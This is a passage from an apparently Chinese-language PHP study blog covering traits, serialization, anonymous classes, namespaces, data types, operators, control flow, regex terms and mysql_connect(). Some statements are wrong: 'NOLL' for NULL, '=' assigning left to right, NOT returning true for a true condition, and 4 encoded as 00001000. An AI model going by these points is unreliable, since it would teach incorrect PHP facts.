punctuation">:</span><span class="token punctuation">:</span>smallTalk insteadof A<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//以B中的smallTalk代替A中的smallTalk</span>        A<span class="token punctuation">:</span><span class="token punctuation">:</span>bigTalk insteadof B<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//将A中的bigTalk代替B中的bigTalk</span>        B<span class="token punctuation">:</span><span class="token punctuation">:</span>bigTalk <span class="token keyword">as</span> talk<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//给B中的bigTalk起个别名叫talk</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span>    <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Aliased_Talker</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$b</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">smallTalk</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$b</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">bigTalk</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$b</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">talk</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//说明替代并不是“覆盖，消除”只是定义同名时优先输出的方法</span><span class="token comment" spellcheck="true">//结果：</span><span class="token comment" spellcheck="true">//bA</span><span class="token comment" spellcheck="true">//bAB</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h4 id="使用as修改类的访问控制"><a href="#使用as修改类的访问控制" class="headerlink" title="使用as修改类的访问控制"></a>使用as修改类的访问控制</h4><blockquote><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">trait</span> <span class="token class-name">HelloWorld</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">sayHello</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">'Hello World!'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 修改 sayHello 的访问控制</span><span class="token keyword">class</span> <span class="token class-name">MyClass1</span> <span class="token punctuation">{</span>    <span class="token keyword">use</span> <span class="token package">HelloWorld</span> <span class="token punctuation">{</span> sayHello <span class="token keyword">as</span> <span class="token keyword">protected</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token comment" spellcheck="true">//格式为{内容}，将sayHello 改为protected属性</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 给方法一个改变了访问控制的别名</span><span class="token comment" spellcheck="true">// 原版 sayHello 的访问控制则没有发生变化</span><span class="token keyword">class</span> <span class="token class-name">MyClass2</span> <span class="token punctuation">{</span>    <span class="token keyword">use</span> <span class="token package">HelloWorld</span> <span class="token punctuation">{</span> sayHello <span class="token keyword">as</span> <span class="token keyword">private</span> Hello<span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token comment" spellcheck="true">//改为private属性，并起别名为Hello</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h4 id="从-trait-来组成-trait"><a href="#从-trait-来组成-trait" class="headerlink" title="从 trait 来组成 trait"></a>从 trait 来组成 trait</h4><blockquote><p>正如 class 能够使用 trait 一样，其它 trait 也能够使用 trait。在 trait 定义时通过使用一个或多个 trait，能够组合其它 trait 中的部分或全部成员</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">trait</span> <span class="token class-name">Hello</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">sayHello</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">'Hello '</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">trait</span> <span class="token class-name">World</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">sayWorld</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">'World!'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">trait</span> <span class="token class-name">HelloWorld</span> <span class="token punctuation">{</span>    <span class="token keyword">use</span> <span class="token package">Hello</span><span class="token punctuation">,</span> World<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//调用上面的trait</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">MyHelloWorld</span> <span class="token punctuation">{</span>    <span class="token keyword">use</span> <span class="token package">HelloWorld</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$o</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MyHelloWorld</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$o</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">sayHello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$o</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">sayWorld</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token comment" spellcheck="true">//输出结果为：Hello World！</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h3 id="对象序列化"><a href="#对象序列化" class="headerlink" title="对象序列化"></a>对象序列化</h3><blockquote><p><strong>所有php里面的值都可以使用函数<a href="https://www.php.net/manual/zh/function.serialize.php">serialize()</a>来返回一个包含字节流的字符串来表示。<a href="https://www.php.net/manual/zh/function.unserialize.php">unserialize()</a>函数能够重新把字符串变回php原来的值。 序列化一个对象将会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字。</strong></p><p><strong>为了能够<a href="https://www.php.net/manual/zh/function.unserialize.php">unserialize()</a>一个对象，这个对象的类必须已经定义过。如果序列化类A的一个对象，将会返回一个跟类A相关，而且包含了对象所有变量值的字符串。 如果要想在另外一个文件中反序列化一个对象，这个对象的类必须在反序列化之前定义，可以通过包含一个定义该类的文件或使用函数<a href="https://www.php.net/manual/zh/function.spl-autoload-register.php">spl_autoload_register()</a>来实现。</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">// classa.inc:</span>    <span class="token keyword">class</span> <span class="token class-name">A</span> <span class="token punctuation">{</span>      <span class="token keyword">public</span> <span class="token variable">$one</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>          <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">show_one</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>          <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">one</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// page1.php:</span>  <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">"classa.inc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">;</span>  <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// 把变量$s保存起来以便文件page2.php能够读到</span>  <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string">'store'</span><span class="token punctuation">,</span> <span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// page2.php:</span>    <span class="token comment" spellcheck="true">// 要正确反序列化，必须包含下面一个文件</span>  <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">"classa.inc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string">'store'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// 现在可以使用对象$a里面的函数 show_one()</span>  <span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">show_one</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//无需实例化</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h4 id="匿名类："><a href="#匿名类：" class="headerlink" title="匿名类："></a>匿名类：</h4><blockquote><p>PHP从7开始支持匿名类，通常匿名类用来创建一次性的简单对象，匿名类可以继承其他类、实现接口、使用trait，还可以向其构造函数传递参数。</p><p>匿名类无需设置类名</p><p>注意，匿名类的名称是通过引擎赋予的，如下例所示。 由于实现的细节，不应该去依赖这个类名。</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token variable">$class</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">class</span>    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token variable">$c</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">c</span> <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">c</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//直接实例化一个不知名的类</span>    <span class="token keyword">echo</span> <span class="token variable">$class</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//输出类的函数</span><span class="token delimiter">?></span>    <span class="token comment" spellcheck="true">//结果为 2</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>匿名类可以直接使用，用后即焚</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">class</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">log</span><span class="token punctuation">(</span><span class="token variable">$msg</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token variable">$msg</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token comment" spellcheck="true">//输出结果</span><span class="token comment" spellcheck="true">//object(class@anonymous)#1 (0) {</span><span class="token comment" spellcheck="true">//}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h5 id="匿名类的嵌套"><a href="#匿名类的嵌套" class="headerlink" title="匿名类的嵌套:"></a>匿名类的嵌套:</h5><blockquote><p>匿名类被嵌套进普通 Class 后，不能访问这个外部类（Outer class）的 private（私有）、protected（受保护）方法或者属性。 为了访问外部类（Outer class）protected 属性或方法，匿名类可以 extend（扩展）此外部类。 为了使用外部类（Outer class）的 private 属性，必须通过构造器传进来：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token keyword">class</span> <span class="token class-name">niming</span>    <span class="token punctuation">{</span>                <span class="token keyword">protected</span> <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token number">100</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//public $a;</span>            <span class="token comment" spellcheck="true">//public function A()</span>        <span class="token comment" spellcheck="true">//{</span>        <span class="token comment" spellcheck="true">//    $this->a = 1;</span>        <span class="token comment" spellcheck="true">//    $this->b = $this->a + 1;</span>        <span class="token comment" spellcheck="true">//    return $this->b;</span>        <span class="token comment" spellcheck="true">//}</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">B</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">class</span> <span class="token keyword">extends</span> <span class="token class-name">niming</span><span class="token punctuation">{</span> <span class="token comment" spellcheck="true">//嵌套一个匿名类</span>                <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">C</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token punctuation">{</span>                    <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">b</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 返回$b的值</span>                    <span class="token comment" spellcheck="true">//如果成功访问到$b = 100 输出100</span>                    <span class="token comment" spellcheck="true">//否则无输出值</span>                <span class="token punctuation">}</span>                            <span class="token punctuation">}</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">niming</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">B</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">C</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//使用extends继承niming类时，结果为100</span><span class="token comment" spellcheck="true">//不继承输出为空</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h3 id="类的实例化"><a href="#类的实例化" class="headerlink" title="类的实例化"></a>类的实例化</h3><h4 id="实例化对象-new"><a href="#实例化对象-new" class="headerlink" title="实例化对象    new"></a>实例化对象    new</h4><blockquote><p>关键字new用于将类实例化成为对象</p><p>语法：$a = new [类的名字] (参数数列表);</p><p>如果不需为对象传递参数，可以只写名字</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$instance</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SimpleClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 也可以这样做：</span><span class="token variable">$className</span> <span class="token operator">=</span> <span class="token string">'SimpleClass'</span><span class="token punctuation">;</span><span class="token variable">$instance</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token variable">$className</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// new SimpleClass()</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><pre><code>public的变量可以如果没有static是可以实例化调用的调用，如果有static，就不能实例化调用。</code></pre><ul><li><p>调用静态的属性和方法：</p><p>  正确做法</p><pre><code>&lt;?phpclass myclass&#123;public static $name=&quot;amos&quot;;&#125;class myclass1&#123;public $mingzi=&quot;amos&quot;;&#125;echo myclass::$name;$p2=new myclass1();echo $p2-&gt;mingzi;?&gt;</code></pre><p>  错误的写法：</p><pre><code>&lt;?phpclass myclass&#123;public static $name=&quot;amos&quot;;&#125;class myclass1&#123;public $mingzi=&quot;amos&quot;;&#125;$p1=new myclass();echo $p1-&gt;name;echo myclass1::$mingzi;?&gt;</code></pre><p>  简单来说，非静态属性和方法先实例化类，在使用-&gt;调用，语法[实例化变量]-&gt;[要调用的属性或方法]；</p><p>  静态属性和方法则使用双冒号调用，语法：[类名]::[要调用的静态属性或方法]</p><pre class="line-numbers language-php"><code class="language-php"><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><h4 id="get-class-译为：获取类"><a href="#get-class-译为：获取类" class="headerlink" title="get_class 译为：获取类"></a>get_class 译为：获取类</h4><blockquote><p>用于返回类的名称</p><p>语法：</p><p>get_class(object $object=?):字符串</p><p>获取给定类的名称object。</p><pre><code>object</code></pre><p>被测对象。在类内部时，可以省略此参数。</p><p>如果在一个类里，省略了参数 <code>object</code>， 则返回当前所在类的名称。</p><p>如果 <code>object</code> 是命名空间中某个类的实例，则会返回带上命名空间的类名。</p></blockquote><h2 id="命名空间"><a href="#命名空间" class="headerlink" title="命名空间"></a>命名空间</h2><h3 id="概述：-1"><a href="#概述：-1" class="headerlink" title="概述："></a>概述：</h3><blockquote><p>命名空间是封装事物的方法</p><p>在很多地方都可以见到这种抽象概念。例如，在操作系统中目录用来将相关文件分组，对于目录中的文件来说，它就扮演了命名空间的角色。具体举个例子，文件 <code>foo.txt</code> 可以同时在目录 <code>/home/greg</code> 和 <code>/home/other</code> 中存在，但在同一个目录中不能存在两个 <code>foo.txt</code> 文件。另外，在目录 <code>/home/greg</code> 外访问 <code>foo.txt</code> 文件时，我们必须将目录名以及目录分隔符放在文件名之前得到 <code>/home/greg/foo.txt</code>。这个原理应用到程序设计领域就是命名空间的概念。</p></blockquote><blockquote><p>在 PHP 中，命名空间用来解决在编写类库或应用程序时创建可重用的代码如类或函数时碰到的两类问题：</p><ol><li>用户编写的代码与PHP内部的类/函数/常量或第三方类/函数/常量之间的名字冲突。</li><li>为很长的标识符名称(通常是为了缓解第一类问题而定义的)创建一个别名（或简短）的名称，提高源代码的可读性。</li></ol><p>PHP 命名空间提供了一种将相关的类、函数和常量组合到一起的途径。</p></blockquote><h3 id="定义命名空间"><a href="#定义命名空间" class="headerlink" title="定义命名空间"></a>定义命名空间</h3><blockquote><p>虽然任意合法的 PHP 代码都可以包含在命名空间中，但只有以下类型的代码受命名空间的影响，它们是：类（包括抽象类和 trait）、接口、函数和常量。</p><p>命名空间通过关键字 <code>namespace</code> 来声明。如果一个文件中包含命名空间，它必须在其它所有代码之前声明命名空间，除了一个以外：<a href="https://www.php.net/manual/zh/control-structures.declare.php">declare</a>关键字。</p></blockquote><h4 id="namespace-方法"><a href="#namespace-方法" class="headerlink" title="namespace 方法"></a>namespace 方法</h4><blockquote><p>namespace 译为：命名空间</p><p>语法：namespace [空间名称]</p><p>在声明命名空间之前唯一合法的代码是用于定义源文件编码方式的 <code>declare</code> 语句。另外，所有非 PHP 代码包括空白符都不能出现在命名空间的声明之前：</p><p>即声明命名空间的语句必须在php代码的第一条</p></blockquote><h2 id="数据类型与逻辑运算"><a href="#数据类型与逻辑运算" class="headerlink" title="数据类型与逻辑运算"></a>数据类型与逻辑运算</h2><h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><ul><li><p>数据的分类  </p><blockquote><p>数据主要分三大类八小类，值存储数据本身的类型而不是变量类型。</p></blockquote><blockquote><p>简单基本数据类型[四小类]<br>1- 整型：<br>int/integer ，在计算机中占四个字节储存，表示整数类型（前提为整型存的下）。<br>2- 浮点型：<br>float/double ，在php中浮点型单双精度是一个概念，两者并无区别，表示小数或整型存不下的数。<br>3- 字符串型：<br>string ,同其他语言，php中字符串用引号引起，系统根据实际长度分配存储空间。<br>4- 布尔型：<br>bool/boolean ,布尔型只有两个值，ture和false,是最简单的类型。</p></blockquote><blockquote><p>复合数据类型[两小类]<br>1- 对象类型：<br>object ,存放对象<br>2- 数组类型：<br>array ,一次性存储多个数据  </p></blockquote><blockquote><p>特殊类型[两小类]<br>1- 资源类型：<br>  resource ，存放数据资源（php外部数据，如数据库，文件）<br>2- 空类型：<br> NOLL ，只有一个NOLL，不能运算。  </p></blockquote></li><li><p>数据类型的转化  </p><blockquote><p>在有些时候需要指定的数据类型，这时需要将数据转化成指定形式 </p></blockquote><blockquote><p>php中类型转化的方式：<br>1- 自动转化：<br>常用，效率低。<br><img src="4.png" alt="4">如图加法运算不能包括字母，此时系统便会自动转化为整形和浮点型运算<br>注意：系统会将数字中遇到的第一个小数点当作浮点型转化，后续小数点会被忽略。<br>2- 强制（手动）转化：<br>在变量前加上括号，括号中写入数据类型。<br>NOLL类型比较特殊，转NOLL类型需要用到unset()函数。<br><img src="5.png" alt="5"></p></blockquote></li><li><p>数据类型判断  </p><blockquote><p>基本作用函数：is_变量名<br>用与查看的函数：var_dump();<br><img src="6.png" alt="6"><br>如图，是则输出turn，不是则输出false。  </p></blockquote><blockquote><p>设定数据类型：<br> gettype(变量名);查看当前数据类型。<br> settype(变量名，类型);设定数据类型（改变数据本身）<br><img src="7.png" alt="7"><br> bool(turn)说明转化成功。 </p></blockquote></li><li><p>数据的进制转化  </p><blockquote><p>进制表示：<br>$a=120 //dec（十进制）<br>$b=0b120 //bin(二进制)<br>$c=0120  //oct(八进制)<br>$d=0x120  //hex(十六进制)<br>注意：php中，所有数都会默认转化为十进制。<br><img src="8.png" alt="8"></p></blockquote><blockquote><p>进制的手动转化：<br> 函数：[转换前]<a href="%E8%BD%AC%E5%8C%96%E5%89%8D%E5%8F%98%E9%87%8F%E6%88%96%E6%95%B0">转换后</a><br><img src="9.png" alt="9"></p></blockquote></li><li><p>浮点型和布尔型的特殊分类：</p><blockquote><p>有小数点默认为浮点型<br>超过整型存储范围为浮点型<br>浮点型不精确<br><img src="10.png" alt="10"></p></blockquote><blockquote><p>两个判断数据存在的函数<br>1- empty(); 判断数据的值是否为空（不是NOLL），是则返回true，不为空返回false.<br>2- isset(); 判断数据储存的变量本身是否存在，存在返回true，不存在返回flase。  </p></blockquote></li></ul><h3 id="逻辑运算"><a href="#逻辑运算" class="headerlink" title="逻辑运算"></a>逻辑运算</h3><ul><li><p>运算符  </p><blockquote><p>赋值，算数与比较。<br>php运算符用法同其他语言。<br>“=”，将左边内容赋值给右边。<br>“+,-,*,/“,同数学<br>“%”,取余运算、返回余数。<br>“&lt;、&gt;、=、!=”，用法同数学。  </p></blockquote><blockquote><p>逻辑运算符<br>与运算：&amp;&amp; 相当与数学的交集，只有同时满足&amp;&amp;两边的条件时返回true，有一个错便是false。<br>或运算：|| 相当于数学的并集，左右两边任意一个成立便返回true，只有两边同时错误才返回false。<br>注意：或运算中如果第一个语句为真，便不再执行第二条语句。<br>非运算：！ 相当与数学的补集，条件为真时返回true，条件为假时返回false。  </p></blockquote><blockquote><p>连接运算符<br> php中语句中间部分用”,”或”.”连接。<br> 错误抑制符<br> “@”:错误抑制符，php有些错误可以被提前预知但无法避免，这时可以用错误抑制符处理。  </p></blockquote><blockquote><p>三目运算符<br>三目运算符是多个表达式运算的简单分支缩写<br>语法格式：<br>表达式1？表达式2：表达式3<br>运算：如果表达式1成立，运行表达式2，否则运行表达式3。<br>三目运算符可以多层使用，如：<br>表达式1？（表达式2？表达式3：表达式4）：（表达式5？表达式6：表达式7）  </p></blockquote><blockquote><p>自操作运算符<br>++<br>i++在i原来的基础上加一（先赋值再加1）<br>++i在原来基础上加一（先加1后赋值）<br>–（与++同理）  </p></blockquote></li><li><p>计算机码  </p><blockquote><p>原码、反码与补码<br>原码是将原本的数按二进制保存在计算机中<br>例如：%d=4/%d=-4<br>原码：00001000  10001000 计算机码中第一个字表示正负，0表示正数、1表示负数。  </p></blockquote><blockquote><p>反码：<br>反正是在原码的基础上，正数不变，负数除开头表示正负的1外全部取反。<br>例如：%d=-4<br>原码：10001000<br>反码：11110111  </p></blockquote><blockquote><p>补码是在反码的基础上，正数不变，负数加1。<br>例如：%d=-4<br>原码：10001000<br>反码：11110111<br>补码：11111000  </p></blockquote><blockquote><p>位运算符<br><img src="11.png" alt="11"></p></blockquote></li><li><p>运算符优先级<br><img src="12.png" alt="12"></p><blockquote><p>如图，优先级自上而下依次降低  </p></blockquote></li></ul><h3 id="结构控制"><a href="#结构控制" class="headerlink" title="结构控制"></a>结构控制</h3><h4 id="选择结构控制"><a href="#选择结构控制" class="headerlink" title="选择结构控制"></a>选择结构控制</h4><ul><li><p>if 分支语句  </p><blockquote><p>if语句用于条件选择<br>结构：<br>if(表达式1)  </p><pre><code>表达式2; //如果表达式1正确执行表达式2  </code></pre><p>else </p><pre><code>表达式3; //反之则执行表达式3  </code></pre></blockquote><blockquote><p>结构嵌套<br>if 语句包括大多数结构控制语句都可以结构嵌套（套娃）<br>如：<br>if(表达式1)</p><pre><code>表达式2;</code></pre><p>  else if(表达式3)</p><pre><code>表达式4； else    whlie&#123;     (表达式5)</code></pre><p>}</p></blockquote></li><li><p>switch分支（转换分支）  </p><blockquote><p>在一种情况下有多个值，每个值都有对应不同的代码执行<br>语句结构：<br>switch(表达式1)<br>  case 值1;  </p><pre><code> 表达式2; //当表达式1的值为值1时，运行表达式2.  </code></pre><p>  break;  //运行表达式2后结束循环，不再进行后续运算。<br>  case 值2;  </p><pre><code> 表达式3; //当表达式1运行结果是值2时，运行表达式3.  </code></pre><p>  break;  </p></blockquote></li></ul><h4 id="循环结构控制"><a href="#循环结构控制" class="headerlink" title="循环结构控制"></a>循环结构控制</h4><ul><li><p>for循环  </p><blockquote><p>for循环格式<br>for(条件表达式1;条件表达式2;条件表达式3)<br>//条件表达式1：定义初始化条件，可以是用逗号分隔的多个语句，但无论是否定义都必须用”;”结束。<br>//条件表达式2：边界判定，限制循环次数，最后要用”;”结束。<br>//条件表达式3：执行条件变化，因其是最后一条语句，不需要用”;”结束。  </p></blockquote></li><li><p>whlie循环与do-while循环    </p><blockquote><p>while循环：<br>循环语句：<br>条件初始化;<br>while(条件表达式)<br>{<br>  循环体  //循环条件变化。<br>}   </p></blockquote><blockquote><p>do-while循环<br>while循环先判断条件表达式，表达式成立才执行，do-while循环先执行循环，再判断表达式是否成立。<br>循环语句：<br>do<br>{<br>  循环体;<br>}<br>while(条件表达式);  </p></blockquote></li></ul><h2 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h2><ul><li><p>PCRE(preg)函数</p><blockquote><p>规则正则读取的一类函数，包括查找，替换，匹配等<br>正则：字符串的匹配规则  </p></blockquote><p> 定界符：正则开始时需写明的字符，常用//也可用||和&lt;&gt;等</p><p> 原子：最少的一个匹配单位，每个正则都要有一个，写与定界符里</p><p> 元字符：用于扩展原子的功能，不能单独使用</p><p> 模式修正符：对整个表达式进行修正，位于定界符外</p></li></ul><h2 id="MySQL数据库的连接"><a href="#MySQL数据库的连接" class="headerlink" title="MySQL数据库的连接"></a>MySQL数据库的连接</h2><h3 id="mysql-connect-函数连接数据库"><a href="#mysql-connect-函数连接数据库" class="headerlink" title="mysql_connect()函数连接数据库"></a>mysql_connect()函数连接数据库</h3><blockquote><p>mysql_connect() 函数打开非持久的 MySQL 连接。</p><pre><code>mysql_connect(server,user,pwd,newlink,clientflag)</code></pre><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">server<br />服务器</td><td align="left">可选。规定要连接的服务器。可以包括端口号，例如 “hostname:port”，或者到本地套接字的路径，例如对于 localhost 的 “:/path/to/socket”。如果 PHP 指令 mysql.default_host 未定义（默认情况），则默认值是 ‘localhost:3306’。</td></tr><tr><td align="left">user</td><td align="left">可选。用户名。默认值是服务器进程所有者的用户名。</td></tr><tr><td align="left">pwd</td><td align="left">可选。密码。默认值是空密码。</td></tr><tr><td align="left">newlink<br />新建链接</td><td align="left">可选。如果用同样的参数第二次调用 mysql_connect()，将不会建立新连接，而将返回已经打开的连接标识。参数 new_link 改变此行为并使 mysql_connect() 总是打开新的连接，甚至当 mysql_connect() 曾在前面被用同样的参数调用过。</td></tr><tr><td align="left">clientflag<br />客户端标志</td><td align="left">可选。client_flags 参数可以是以下常量的组合：MYSQL_CLIENT_SSL - 使用 SSL 加密MYSQL_CLIENT_COMPRESS - 使用压缩协议MYSQL_CLIENT_IGNORE_SPACE - 允许函数名后的间隔MYSQL_CLIENT_INTERACTIVE - 